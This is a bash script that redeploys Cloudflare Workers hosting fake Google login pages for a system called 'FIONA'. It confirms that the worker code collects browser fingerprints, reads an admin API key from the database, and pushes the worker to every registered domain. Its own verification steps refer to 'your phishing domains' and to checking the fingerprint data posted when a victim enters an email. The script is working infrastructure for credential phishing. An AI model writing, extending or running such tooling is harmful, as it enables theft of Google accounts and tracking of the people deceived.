#!/bin/bash
# Redeploy ALL Cloudflare Workers with Updated Fingerprint Code
# Run this on your Ubuntu server after uploading the new worker.js

set -e

echo "=============================================="
echo "FIONA - Redeploy ALL Cloudflare Workers"
echo "=============================================="
echo ""

cd /var/www/fiona/backend || exit 1

echo "Step 1: Verifying new worker.js has fingerprint code..."
if grep -q "const fingerprint = {" login-pages/google/worker.js; then
  echo "✅ Fingerprint collection code found in worker.js"
else
  echo "❌ ERROR: worker.js does not have fingerprint code!"
  echo "   Please upload the updated worker.js first:"
  echo "   scp 'C:\\Users\\happy\\OneDrive\\Desktop\\prxyauth-desktop-1.2.4\\backend\\login-pages\\google\\worker.js' root@your-server:/var/www/fiona/backend/login-pages/google/worker.js"
  exit 1
fi
echo ""

echo "Step 2: Getting list of ALL active domains with workers..."
DOMAIN_LIST=$(sqlite3 prisma/dev.db "SELECT id, name, cfWorkerName FROM Domain WHERE cfWorkerName IS NOT NULL;" 2>/dev/null || echo "")

if [ -z "$DOMAIN_LIST" ]; then
  echo "ℹ️  No domains with deployed workers found."
  echo "   Add domains through the admin panel first."
  exit 0
fi

DOMAIN_COUNT=$(echo "$DOMAIN_LIST" | wc -l)
echo "✅ Found $DOMAIN_COUNT domain(s) with deployed workers"
echo ""

echo "Step 3: Getting admin API token..."
ADMIN_TOKEN=$(sqlite3 prisma/dev.db "SELECT apiKey FROM User WHERE role='ADMIN' LIMIT 1;" 2>/dev/null || echo "")

if [ -z "$ADMIN_TOKEN" ]; then
  echo "❌ ERROR: No admin API key found in database"
  echo "   Please generate an API key for an admin user"
  exit 1
fi
echo "✅ Admin token retrieved"
echo ""

echo "Step 4: Redeploying workers to Cloudflare..."
echo "--------------------------------------------"

SUCCESS_COUNT=0
FAIL_COUNT=0

while IFS='|' read -r domain_id domain_name worker_name; do
  echo "🔄 Processing: $domain_name"
  
  # Call the repair endpoint which forces worker redeployment
  RESPONSE=$(curl -s -X POST "http://localhost:8000/api/admin/domains/$domain_id/repair" \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" 2>&1)
  
  if echo "$RESPONSE" | grep -q '"success":true'; then
    echo "   ✅ $domain_name - Worker updated on Cloudflare"
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  else
    echo "   ❌ $domain_name - Failed to update"
    echo "      Response: $RESPONSE"
    FAIL_COUNT=$((FAIL_COUNT + 1))
  fi
  
  # Small delay to avoid rate limiting
  sleep 1
done <<< "$DOMAIN_LIST"

echo ""
echo "=============================================="
echo "DEPLOYMENT SUMMARY"
echo "=============================================="
echo "✅ Successful: $SUCCESS_COUNT"
echo "❌ Failed: $FAIL_COUNT"
echo "📊 Total: $DOMAIN_COUNT"
echo ""

if [ $FAIL_COUNT -gt 0 ]; then
  echo "⚠️  Some deployments failed. Check the logs:"
  echo "   pm2 logs fiona-backend --lines 100"
  echo ""
fi

echo "VERIFICATION:"
echo "1. Visit one of your phishing domains"
echo "2. Open DevTools (F12) → Network tab"
echo "3. Enter an email and click Next"
echo "4. Check POST /api/google/session/start payload"
echo "5. Should contain 'fingerprint' object"
echo ""
echo "BACKEND LOGS:"
echo "pm2 logs fiona-backend --lines 50 | grep FINGERPRINT"
echo ""
